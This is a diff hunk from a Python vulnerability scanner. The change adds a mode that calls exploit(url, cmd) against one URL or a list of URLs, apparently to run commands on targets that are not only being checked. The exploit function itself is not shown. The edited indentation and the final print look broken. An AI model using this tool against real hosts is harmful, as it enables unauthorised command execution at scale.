@@ -93,40 +93,45 @@ def check(url):
 
 def main(url=url, usedlist=usedlist, do_check=do_check):
 	print banner()
-	if url:
-		if do_check:
-			result = check(url)  # Only check for existence of Vulnerablity
-			output = '[*] Status: '
-			if result is True:
-				output += 'Vulnerable!'
-			else:
-				output += 'Not Affected.'
-		print(output)
-			  
-	if usedlist:
-		URLs_List = []
-		try:
-			f_file = open(str(usedlist), 'r')
-			URLs_List = f_file.read().replace('\r', '').split('\n')
-			try:
-				URLs_List.remove('')
-			except ValueError:
-				pass
-				f_file.close()
-		except:
-			print('Error: There was an error in reading list file.')
-			exit(1)
-		for url in URLs_List:
-			if do_check:
-				result = check(url)  # Only check for existence of Vulnerablity
-				output = '[*] Status: '
-				if result is True:
-					output += 'Vulnerable!'
-				else:
-					output += 'Not Affected.'
-		print(output)
+        if url:
+            if do_check:
+                result = check(url)  # Only check for existence of Vulnerablity
+                output = '[*] Status: '
+                if result is True:
+                    output += 'Vulnerable!'
+                else:
+                    output += 'Not Affected.'
+            else:
+                output = exploit(url, cmd)  # Exploit
+            print(output)
 
-	print('[*] Done.')
+        if usedlist:
+            URLs_List = []
+            try:
+                f_file = open(str(usedlist), 'r')
+                URLs_List = f_file.read().replace('\r', '').split('\n')
+                try:
+                    URLs_List.remove('')
+                except ValueError:
+                    pass
+                    f_file.close()
+            except:
+                print('Error: There was an error in reading list file.')
+                exit(1)
+            for url in URLs_List:
+                if do_check:
+                    result = check(url)  # Only check for existence of Vulnerablity
+                    output = '[*] Status: '
+                    if result is True:
+                        output += 'Vulnerable!'
+                    else:
+                        output += 'Not Affected.'
+                else:
+                    output = exploit(url, cmd)  # Exploit
+                print(output)
+
+print('[%] Done.')
+
 	  
 if __name__ == '__main__':
 	try:
